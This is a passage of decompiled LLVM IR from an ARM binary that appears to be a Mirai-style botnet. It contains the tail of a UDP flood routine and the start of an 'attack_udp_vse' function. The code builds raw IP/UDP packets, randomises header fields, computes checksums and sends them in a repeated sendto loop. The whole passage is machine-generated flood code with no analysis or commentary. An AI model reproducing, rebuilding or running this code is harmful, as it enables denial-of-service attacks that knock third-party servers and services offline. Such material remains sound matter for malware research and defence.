  store i32 %v1_b944, i32* %ip.global-to-local, align 4
  %v0_bb28 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb28 = mul i32 %v0_bb28, 32
  store i32 %v3_bb28, i32* %r2.global-to-local, align 4
  store i8 %v1_bb20, i8* %v1_bb18, align 1
  %v0_bb30 = load i32, i32* %r1.global-to-local, align 4
  %v1_bb30 = add i32 %v0_bb30, 1
  store i32 %v1_bb30, i32* @r4, align 4
  %v0_bb34 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_bb30, -8
  %v5_bb34 = add i32 %v0_bb34, %tmp61
  store i32 %v5_bb34, i32* %r2.global-to-local, align 4
  store i32 %v6_b8dc, i32* %r1.global-to-local, align 4
  %v2_bb3c = load i32, i32* %r0.global-to-local, align 4
  %v3_bb3c = add i32 %v2_bb3c, 1
  %v4_bb3c = inttoptr i32 %v3_bb3c to i8*
  store i8 %v5_b8fc, i8* %v4_bb3c, align 1
  store i32 %v1_b920, i32* %r3.global-to-local, align 4
  %v0_bb44 = load i32, i32* %ip.global-to-local, align 4
  %v2_bb44 = icmp eq i32 %v0_bb44, 0
  store i1 %v2_bb44, i1* %cpsr_z.global-to-local, align 1
  %v2_bb48 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb48 = add i32 %v2_bb48, 8
  %v4_bb48 = inttoptr i32 %v3_bb48 to i8*
  store i8 %v1_bb48, i8* %v4_bb48, align 1
  %v0_bb4c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bb4c, label %.thread8, label %bb60

bb60:                                             ; preds = %dec_label_pc_bae8
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_bb50 = load i32, i32* %r0.global-to-local, align 4
  %v4_bb50 = add i32 %v3_bb50, 6
  %v5_bb50 = inttoptr i32 %v4_bb50 to i16*
  store i16 64, i16* %v5_bb50, align 2
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_bae8, %bb60
  store i32 %v4_bb54, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_bb5c = load i32, i32* %r0.global-to-local, align 4
  %v3_bb5c = add i32 %v2_bb5c, 9
  %v4_bb5c = inttoptr i32 %v3_bb5c to i8*
  store i8 17, i8* %v4_bb5c, align 1
  %v0_bb60 = load i32, i32* %ip.global-to-local, align 4
  %v1_bb60 = trunc i32 %v0_bb60 to i16
  %v2_bb60 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb60 = add i32 %v2_bb60, 2
  %v4_bb60 = inttoptr i32 %v3_bb60 to i16*
  store i16 %v1_bb60, i16* %v4_bb60, align 2
  store i32 %v6_b9cc, i32* %ip.global-to-local, align 4
  %v1_bb68 = load i32, i32* %r0.global-to-local, align 4
  %v2_bb68 = add i32 %v1_bb68, 12
  %v3_bb68 = inttoptr i32 %v2_bb68 to i32*
  store i32 %v6_b9cc, i32* %v3_bb68, align 4
  %v0_bb6c = load i32, i32* %r2.global-to-local, align 4
  %v1_bb6c = load i32, i32* @r8, align 4
  %v2_bb6c = add i32 %v1_bb6c, %v0_bb6c
  store i32 %v2_bb6c, i32* %r2.global-to-local, align 4
  %v1_bb70 = add i32 %v2_bb6c, 16
  %v2_bb70 = inttoptr i32 %v1_bb70 to i32*
  %v3_bb70 = load i32, i32* %v2_bb70, align 4
  store i32 %v3_bb70, i32* %r3.global-to-local, align 4
  %v0_bb74 = load i32, i32* @r5, align 4
  %v1_bb74 = trunc i32 %v0_bb74 to i16
  %v2_bb74 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb74 = add i32 %v2_bb74, 4
  %v4_bb74 = inttoptr i32 %v3_bb74 to i16*
  store i16 %v1_bb74, i16* %v4_bb74, align 2
  %v0_bb78 = load i32, i32* %r0.global-to-local, align 4
  %v1_bb78 = add i32 %v0_bb78, 20
  store i32 %v1_bb78, i32* %r1.global-to-local, align 4
  %v0_bb7c = load i32, i32* %r3.global-to-local, align 4
  %v2_bb7c = add i32 %v0_bb78, 16
  %v3_bb7c = inttoptr i32 %v2_bb7c to i32*
  store i32 %v0_bb7c, i32* %v3_bb7c, align 4
  %v0_bb80 = load i32, i32* @r6, align 4
  %v1_bb80 = trunc i32 %v0_bb80 to i16
  %v2_bb80 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb80 = add i32 %v2_bb80, 20
  %v4_bb80 = inttoptr i32 %v3_bb80 to i16*
  store i16 %v1_bb80, i16* %v4_bb80, align 2
  store i32 %v3_bb88, i32* %r0.global-to-local, align 4
  store i32 %v7_bb88, i32* %r3.global-to-local, align 4
  %v0_bb8c = load i32, i32* @r4, align 4
  %v1_bb8c = load i32, i32* @r7, align 4
  %v9_bb8c = icmp eq i32 %v0_bb8c, %v1_bb8c
  store i1 %v9_bb8c, i1* %cpsr_z.global-to-local, align 1
  %v2_bb90 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb90 = add i32 %v2_bb90, 4
  %v4_bb90 = inttoptr i32 %v3_bb90 to i16*
  store i16 %rev, i16* %v4_bb90, align 2
  %v0_bb94 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb94 = trunc i32 %v0_bb94 to i16
  %v2_bb94 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb94 = add i32 %v2_bb94, 2
  %v4_bb94 = inttoptr i32 %v3_bb94 to i16*
  store i16 %v1_bb94, i16* %v4_bb94, align 2
  %v0_bb98 = load i32, i32* @r4, align 4
  store i32 %v0_bb98, i32* %stack_var_-44, align 4
  %v5_bb9c = icmp slt i32 %v0_bb8c, %v1_bb8c
  br i1 %v5_bb9c, label %dec_label_pc_bae8, label %dec_label_pc_bba0.preheader.loopexit

dec_label_pc_bba0.preheader.loopexit:             ; preds = %.thread8
  %v0_bba4.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_bba0.preheader

dec_label_pc_bba0.preheader:                      ; preds = %.thread, %dec_label_pc_bba0.preheader.loopexit
  %v0_bba4.pre = phi i32 [ %v0_bba4.pre.pre, %dec_label_pc_bba0.preheader.loopexit ], [ 0, %.thread ]
  %v3_bd0c = icmp eq i32 %v6_b9cc, -1
  %v8_bd0c = icmp eq i32 %v6_b9cc, -1
  %v9_bd24 = icmp eq i32 %v3_ba5c, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  %v2_bd60 = icmp eq i32 %v1_b9b8, 0
  br label %dec_label_pc_bba0

dec_label_pc_bba0:                                ; preds = %dec_label_pc_bba0, %dec_label_pc_bca0, %dec_label_pc_bba0.preheader
  %v0_bba4 = phi i32 [ %v0_bba4.pre, %dec_label_pc_bba0.preheader ], [ 0, %dec_label_pc_bca0 ], [ 0, %dec_label_pc_bba0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bba4 = icmp eq i32 %v0_bba4, 0
  store i1 %v2_bba4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bba4, label %dec_label_pc_bba0, label %dec_label_pc_bbb0

dec_label_pc_bbb0:                                ; preds = %dec_label_pc_bba0, %dec_label_pc_bca0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bbb4

dec_label_pc_bbb4:                                ; preds = %dec_label_pc_bc1c, %dec_label_pc_bbb0
  %v1_bbc8 = phi i32 [ %v1_bc90, %dec_label_pc_bc1c ], [ 0, %dec_label_pc_bbb0 ]
  %v5_bbb8 = mul i32 %v1_bbc8, 24
  %v1_bbbc = load i32, i32* @r8, align 4
  %v2_bbbc = add i32 %v1_bbbc, %v5_bbb8
  store i32 %v2_bbbc, i32* %r3.global-to-local, align 4
  store i32 %v2_b8c4, i32* %r1.global-to-local, align 4
  %v1_bbc4 = add i32 %v2_bbbc, 20
  %v2_bbc4 = inttoptr i32 %v1_bbc4 to i8*
  %v3_bbc4 = load i8, i8* %v2_bbc4, align 1
  %v4_bbc4 = zext i8 %v3_bbc4 to i32
  store i32 %v4_bbc4, i32* %r2.global-to-local, align 4
  %v4_bbc8 = mul i32 %v1_bbc8, 4
  %v5_bbc8 = add i32 %v4_bbc8, %v2_b8c4
  %v6_bbc8 = inttoptr i32 %v5_bbc8 to i32*
  %v7_bbc8 = load i32, i32* %v6_bbc8, align 4
  store i32 %v7_bbc8, i32* @r5, align 4
  %v7_bbcc = icmp eq i8 %v3_bbc4, 31
  store i1 %v7_bbcc, i1* %cpsr_z.global-to-local, align 1
  %v1_bbd0 = add i32 %v7_bbc8, 20
  store i32 %v1_bbd0, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_bbc4, 32
  br i1 %tmp62, label %dec_label_pc_bcb4, label %dec_label_pc_bbd8

dec_label_pc_bbd8:                                ; preds = %dec_label_pc_bbb4
  store i32 %v6_b9cc, i32* %r3.global-to-local, align 4
  store i1 %v8_bd0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_bd0c, label %dec_label_pc_bd14, label %dec_label_pc_bbe4

dec_label_pc_bbe4:                                ; preds = %dec_label_pc_bcb4, %dec_label_pc_bbd8
  store i32 %v3_ba5c, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_bd24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bd24, label %dec_label_pc_bd30, label %dec_label_pc_bbf8

dec_label_pc_bbf8:                                ; preds = %dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge, %dec_label_pc_bbe4
  %v1_bbfc = phi i32 [ %v1_bbfc.pre, %dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), %dec_label_pc_bbe4 ]
  store i32 %v3_ba3c, i32* %r0.global-to-local, align 4
  %v9_bbfc = icmp eq i32 %v3_ba3c, %v1_bbfc
  store i1 %v9_bbfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bbfc, label %dec_label_pc_bd44, label %dec_label_pc_bc04

dec_label_pc_bc04:                                ; preds = %dec_label_pc_bd30, %dec_label_pc_bbf8
  %v1_bc08 = phi i32 [ %v1_bd3c, %dec_label_pc_bd30 ], [ %v1_bbfc, %dec_label_pc_bbf8 ]
  store i32 %v3_ba54, i32* %r1.global-to-local, align 4
  %v9_bc08 = icmp eq i32 %v3_ba54, %v1_bc08
  store i1 %v9_bc08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bc08, label %dec_label_pc_bd58, label %dec_label_pc_bc10

dec_label_pc_bc10:                                ; preds = %dec_label_pc_bd44, %dec_label_pc_bc04
  store i32 %v1_b9b8, i32* %r3.global-to-local, align 4
  store i1 %v2_bd60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bd60, label %dec_label_pc_bc1c, label %dec_label_pc_bd6c

dec_label_pc_bc1c:                                ; preds = %dec_label_pc_bc10, %dec_label_pc_bd58, %dec_label_pc_bd6c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_bc20 = load i32, i32* @r5, align 4
  %v3_bc20 = add i32 %v2_bc20, 10
  %v4_bc20 = inttoptr i32 %v3_bc20 to i16*
  store i16 0, i16* %v4_bc20, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bc28 = load i32, i32* @r5, align 4
  store i32 %v0_bc28, i32* @r0, align 4
  %v2_bc2c = call i32 @checksum_generic(i32 %v0_bc28, i32 20)
  %v3_bc2c = trunc i32 %v2_bc2c to i16
  %v3_bc30 = load i32, i32* @r5, align 4
  %v4_bc30 = add i32 %v3_bc30, 10
  %v5_bc30 = inttoptr i32 %v4_bc30 to i16*
  store i16 %v3_bc2c, i16* %v5_bc30, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_bc38 = load i32, i32* @r6, align 4
  %v3_bc38 = add i32 %v2_bc38, 6
  %v4_bc38 = inttoptr i32 %v3_bc38 to i16*
  store i16 0, i16* %v4_bc38, align 2
  %v0_bc3c = load i32, i32* @r6, align 4
  store i32 %v0_bc3c, i32* @r1, align 4
  %v1_bc40 = add i32 %v0_bc3c, 4
  %v2_bc40 = inttoptr i32 %v1_bc40 to i16*
  %v3_bc40 = load i16, i16* %v2_bc40, align 2
  %v4_bc40 = zext i16 %v3_bc40 to i32
  store i32 %v4_bc40, i32* %r2.global-to-local, align 4
  %v0_bc44 = load i32, i32* @sl, align 4
  store i32 %v0_bc44, i32* %r3.global-to-local, align 4
  %v0_bc48 = load i32, i32* @r5, align 4
  store i32 %v0_bc48, i32* %r0.global-to-local, align 4
  %v4_bc4c = call i32 @checksum_tcpudp(i32 %v0_bc48, i32 %v0_bc3c, i32 %v4_bc40, i32 %v0_bc44)
  %v5_bc4c = trunc i32 %v4_bc4c to i16
  store i32 %v4_bc4c, i32* %r0.global-to-local, align 4
  %v3_bc50 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc50, i32* %r3.global-to-local, align 4
  %v3_bc54 = mul i32 %v3_bc50, 32
  store i32 %v3_bc54, i32* %lr.global-to-local, align 4
  %v3_bc58 = load i32, i32* @r6, align 4
  %v4_bc58 = add i32 %v3_bc58, 6
  %v5_bc58 = inttoptr i32 %v4_bc58 to i16*
  store i16 %v5_bc4c, i16* %v5_bc58, align 2
  %v0_bc5c = load i32, i32* %lr.global-to-local, align 4
  %v1_bc5c = load i32, i32* %r3.global-to-local, align 4
  %tmp63 = mul i32 %v1_bc5c, -8
  %v5_bc5c = add i32 %v0_bc5c, %tmp63
  store i32 %v5_bc5c, i32* %lr.global-to-local, align 4
  %v0_bc60 = load i32, i32* @r6, align 4
  %v1_bc60 = add i32 %v0_bc60, 2
  %v2_bc60 = inttoptr i32 %v1_bc60 to i16*
  %v3_bc60 = load i16, i16* %v2_bc60, align 2
  %v4_bc60 = zext i16 %v3_bc60 to i32
  store i32 %v4_bc60, i32* @r6, align 4
  %v1_bc64 = load i32, i32* @r8, align 4
  %v2_bc64 = add i32 %v1_bc64, %v5_bc5c
  store i32 %v2_bc64, i32* @lr, align 4
  %v3_bc68 = add i32 %v2_bc64, 2
  %v4_bc68 = inttoptr i32 %v3_bc68 to i16*
  store i16 %v3_bc60, i16* %v4_bc68, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_bc74 = load i32, i32* @r5, align 4
  store i32 %v0_bc74, i32* %r1.global-to-local, align 4
  %v0_bc78 = load i32, i32* @fp, align 4
  store i32 %v0_bc78, i32* %r0.global-to-local, align 4
  %v0_bc7c = load i32, i32* @sb, align 4
  store i32 %v0_bc7c, i32* %r2.global-to-local, align 4
  %v0_bc80 = load i32, i32* @lr, align 4
  %v6_bc88 = call i32 @__libc_sendto(i32 %v0_bc78, i32 %v0_bc74, i32 %v0_bc7c, i32 16384, i32 %v0_bc80, i32 16)
  %v3_bc8c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc8c, i32* %r3.global-to-local, align 4
  %v1_bc90 = add i32 %v3_bc8c, 1
  store i32 %v1_bc90, i32* %r0.global-to-local, align 4
  %v1_bc94 = load i32, i32* @r7, align 4
  %v9_bc94 = icmp eq i32 %v1_bc90, %v1_bc94
  store i1 %v9_bc94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bc90, i32* %stack_var_-44, align 4
  %v5_bc9c = icmp slt i32 %v1_bc90, %v1_bc94
  br i1 %v5_bc9c, label %dec_label_pc_bbb4, label %dec_label_pc_bca0

dec_label_pc_bca0:                                ; preds = %dec_label_pc_bc1c
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bca4 = icmp eq i32 %v1_bc94, 0
  store i1 %v2_bca4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bca4, label %dec_label_pc_bba0, label %dec_label_pc_bbb0

dec_label_pc_bcb4:                                ; preds = %dec_label_pc_bbb4
  %v1_bcb4 = add i32 %v2_bbbc, 16
  %v2_bcb4 = inttoptr i32 %v1_bcb4 to i32*
  %v3_bcb4 = load i32, i32* %v2_bcb4, align 4
  %v0_bcb8 = call i32 @rand_next()
  store i32 %v0_bcb8, i32* %r0.global-to-local, align 4
  %v3_bcbc = load i32, i32* %stack_var_-44, align 4
  %v5_bcc4 = mul i32 %v3_bcbc, 24
  %v1_bcc8 = and i32 %v3_bcb4, 16711680
  store i32 %v1_bcc8, i32* %ip.global-to-local, align 4
  %v3_bccc = udiv i32 %v3_bcb4, 16777216
  %v4_bcd0 = udiv i32 %v1_bcc8, 256
  %v5_bcd0 = or i32 %v4_bcd0, %v3_bccc
  store i32 %v5_bcd0, i32* %r2.global-to-local, align 4
  %v1_bcd4 = load i32, i32* @r8, align 4
  %v2_bcd4 = add i32 %v1_bcd4, %v5_bcc4
  store i32 %v2_bcd4, i32* %r1.global-to-local, align 4
  %v1_bcd8 = and i32 %v3_bcb4, 65280
  store i32 %v1_bcd8, i32* %r3.global-to-local, align 4
  %v1_bcdc = add i32 %v2_bcd4, 20
  %v2_bcdc = inttoptr i32 %v1_bcdc to i8*
  %v3_bcdc = load i8, i8* %v2_bcdc, align 1
  %v4_bcdc = zext i8 %v3_bcdc to i32
  store i32 %v4_bcdc, i32* %ip.global-to-local, align 4
  %v5_bce4 = call i32 @llvm.bswap.i32(i32 %v3_bcb4)
  %v7_bce8 = lshr i32 %v0_bcb8, %v4_bcdc
  %v8_bce8 = add i32 %v7_bce8, %v5_bce4
  store i32 %v8_bce8, i32* %r2.global-to-local, align 4
  %v1_bcec = and i32 %v8_bce8, 16711680
  store i32 %v1_bcec, i32* %r0.global-to-local, align 4
  %v1_bcf8 = and i32 %v8_bce8, 65280
  store i32 %v1_bcf8, i32* %r1.global-to-local, align 4
  %v5_bd00 = call i32 @llvm.bswap.i32(i32 %v8_bce8)
  %v1_bd04 = load i32, i32* @r5, align 4
  %v2_bd04 = add i32 %v1_bd04, 16
  %v3_bd04 = inttoptr i32 %v2_bd04 to i32*
  store i32 %v5_bd00, i32* %v3_bd04, align 4
  store i32 %v6_b9cc, i32* %r3.global-to-local, align 4
  store i1 %v8_bd0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bd0c, label %dec_label_pc_bd14, label %dec_label_pc_bbe4

dec_label_pc_bd14:                                ; preds = %dec_label_pc_bcb4, %dec_label_pc_bbd8
  %v0_bd14 = call i32 @rand_next()
  store i32 %v0_bd14, i32* %r0.global-to-local, align 4
  store i32 %v3_ba5c, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_bd24, i1* %cpsr_z.global-to-local, align 1
  %v1_bd28 = load i32, i32* @r5, align 4
  %v2_bd28 = add i32 %v1_bd28, 12
  %v3_bd28 = inttoptr i32 %v2_bd28 to i32*
  store i32 %v0_bd14, i32* %v3_bd28, align 4
  br i1 %v9_bd24, label %dec_label_pc_bd30, label %dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge

dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge:    ; preds = %dec_label_pc_bd14
  %v1_bbfc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bbf8

dec_label_pc_bd30:                                ; preds = %dec_label_pc_bd14, %dec_label_pc_bbe4
  %v0_bd30 = call i32 @rand_next()
  %v1_bd30 = trunc i32 %v0_bd30 to i16
  %v3_bd34 = load i32, i32* @r5, align 4
  %v4_bd34 = add i32 %v3_bd34, 4
  %v5_bd34 = inttoptr i32 %v4_bd34 to i16*
  store i16 %v1_bd30, i16* %v5_bd34, align 2
  store i32 %v3_ba3c, i32* %r0.global-to-local, align 4
  %v1_bd3c = load i32, i32* @r4, align 4
  %v9_bd3c = icmp eq i32 %v3_ba3c, %v1_bd3c
  store i1 %v9_bd3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bd3c, label %dec_label_pc_bd44, label %dec_label_pc_bc04

dec_label_pc_bd44:                                ; preds = %dec_label_pc_bd30, %dec_label_pc_bbf8
  %v0_bd44 = call i32 @rand_next()
  %v1_bd44 = trunc i32 %v0_bd44 to i16
  store i32 %v0_bd44, i32* %r0.global-to-local, align 4
  store i32 %v3_ba54, i32* %r1.global-to-local, align 4
  %v1_bd4c = load i32, i32* @r4, align 4
  %v9_bd4c = icmp eq i32 %v3_ba54, %v1_bd4c
  store i1 %v9_bd4c, i1* %cpsr_z.global-to-local, align 1
  %v3_bd50 = load i32, i32* @r5, align 4
  %v4_bd50 = add i32 %v3_bd50, 20
  %v5_bd50 = inttoptr i32 %v4_bd50 to i16*
  store i16 %v1_bd44, i16* %v5_bd50, align 2
  br i1 %v9_bd4c, label %dec_label_pc_bd58, label %dec_label_pc_bc10

dec_label_pc_bd58:                                ; preds = %dec_label_pc_bd44, %dec_label_pc_bc04
  %v0_bd58 = call i32 @rand_next()
  %v1_bd58 = trunc i32 %v0_bd58 to i16
  store i32 %v0_bd58, i32* %r0.global-to-local, align 4
  store i32 %v1_b9b8, i32* %r3.global-to-local, align 4
  store i1 %v2_bd60, i1* %cpsr_z.global-to-local, align 1
  %v3_bd64 = load i32, i32* @r6, align 4
  %v4_bd64 = add i32 %v3_bd64, 2
  %v5_bd64 = inttoptr i32 %v4_bd64 to i16*
  store i16 %v1_bd58, i16* %v5_bd64, align 2
  br i1 %v2_bd60, label %dec_label_pc_bc1c, label %dec_label_pc_bd6c

dec_label_pc_bd6c:                                ; preds = %dec_label_pc_bc10, %dec_label_pc_bd58
  %v0_bd6c = load i32, i32* @r5, align 4
  %v1_bd6c = add i32 %v0_bd6c, 28
  store i32 %v1_bd6c, i32* %r0.global-to-local, align 4
  store i32 %v0_ba84, i32* %r1.global-to-local, align 4
  %v2_bd74 = inttoptr i32 %v1_bd6c to i16*
  %v3_bd74 = call i32 @rand_str(i16* %v2_bd74, i32 %v0_ba84)
  store i32 %v3_bd74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bc1c

dec_label_pc_bd7c:                                ; preds = %dec_label_pc_b9f0
  %v0_bd7c = load i32, i32* @fp, align 4
  store i32 %v0_bd7c, i32* %r0.global-to-local, align 4
  %v1_bd80 = call i32 @__GI___libc_close(i32 %v0_bd7c)
  store i32 %v1_bd80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bd84

dec_label_pc_bd84:                                ; preds = %entry, %dec_label_pc_bd7c
  %v1_bd8c = phi i32 [ %v3_b9e0, %entry ], [ %v1_bd80, %dec_label_pc_bd7c ]
  store i32 %v18_b8a8, i32* %sb.global-to-local, align 4
  store i32 %v27_b8a8, i32* %lr.global-to-local, align 4
  ret i32 %v1_bd8c

; uselistorder directives
  uselistorder i32 %v0_bd58, { 1, 0 }
  uselistorder i32 %v0_bd44, { 1, 0 }
  uselistorder i32 %v1_bd3c, { 1, 0 }
  uselistorder i32 %v3_bcb4, { 2, 1, 3, 0 }
  uselistorder i32 %v1_bc90, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_bc5c, { 1, 0 }
  uselistorder i32 %v4_bc4c, { 1, 0 }
  uselistorder i1 %v2_bd60, { 2, 3, 1, 0 }
  uselistorder i1 %v9_bd24, { 2, 3, 1, 0 }
  uselistorder i32 %v3_bad0, { 1, 0 }
  uselistorder i16 %rev, { 1, 0 }
  uselistorder i32 %v3_bab8, { 1, 0 }
  uselistorder i32 %v1_ba88, { 1, 0, 2 }
  uselistorder i32 %v1_ba84, { 1, 0, 2 }
  uselistorder i32 %v3_ba5c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ba44, { 1, 0, 2, 3 }
  uselistorder i32 %v3_ba3c, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 %v0_ba34, { 1, 0, 2 }
  uselistorder i32 %v0_ba84, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 %v3_ba24, { 3, 1, 2, 0 }
  uselistorder i1 %v7_ba10, { 1, 0 }
  uselistorder i1 %v7_b9e4, { 1, 0 }
  uselistorder i32 %v3_b9e0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_b9cc, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_b9b8, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v1_b944, { 1, 2, 0 }
  uselistorder i32 %v1_b920, { 2, 1, 0 }
  uselistorder i32 %v6_b918, { 1, 0 }
  uselistorder i32 %v7_b900, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_b8dc, { 2, 1, 3, 0 }
  uselistorder i32 %v2_b8c4, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 24, 23, 25, 26, 28, 27, 30, 29, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 7, 5, 9, 8, 11, 10, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 34, 30, 31, 32, 33, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32 (i16*, i32)* @rand_str, { 0, 1, 2, 3, 10, 4, 5, 6, 9, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bd84, { 1, 0 }
  uselistorder label %dec_label_pc_bd6c, { 1, 0 }
  uselistorder label %dec_label_pc_bc1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bbb0, { 1, 0 }
  uselistorder label %dec_label_pc_bba0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bba0.preheader, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @attack_udp_vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_bd94 = load i32, i32* @r4, align 4
  %v27_bd94 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_bdb0 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_bdb4 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_bdb0, i32* @fp, align 4
  %v0_bdc4 = load i32, i32* @r4, align 4
  %v5_bdc8 = inttoptr i32 %v0_bdb4 to i32*
  %v6_bdc8 = call i32 @attack_get_opt_int(i32 %v0_bdc4, i32* %v5_bdc8, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v1_bdd4 = urem i32 %v6_bdc8, 256
  store i32 %v1_bdd4, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bde0 = load i32, i32* @r4, align 4
  %v0_bde4 = load i32, i32* @r5, align 4
  %v5_bde8 = trunc i32 %v6_bdc8 to i8
  %v6_bdec = inttoptr i32 %v0_bde4 to i32*
  %v7_bdec = call i32 @attack_get_opt_int(i32 %v0_bde0, i32* %v6_bdec, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v6_bdc8)
  %v0_bdf0 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bdec, i32* @r7, align 4
  %v0_be00 = load i32, i32* @r4, align 4
  %v5_be04 = inttoptr i32 %v0_bdf0 to i32*
  %v6_be04 = call i32 @attack_get_opt_int(i32 %v0_be00, i32* %v5_be04, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_be0c = urem i32 %v6_be04, 256
  store i32 %v1_be0c, i32* %ip.global-to-local, align 4
  %v0_be10 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_be1c = load i32, i32* @r4, align 4
  %sext = mul i32 %v6_be04, 16777216
  %v5_be24 = sdiv i32 %sext, 16777216
  %v6_be24 = inttoptr i32 %v0_be10 to i32*
  %v7_be24 = call i32 @attack_get_opt_int(i32 %v0_be1c, i32* %v6_be24, i32 5, i32 0, i32 %v5_be24)
  %v1_be30 = urem i32 %v7_be24, 256
  store i32 %v1_be30, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_be3c = load i32, i32* @r4, align 4
  %v0_be40 = load i32, i32* @r5, align 4
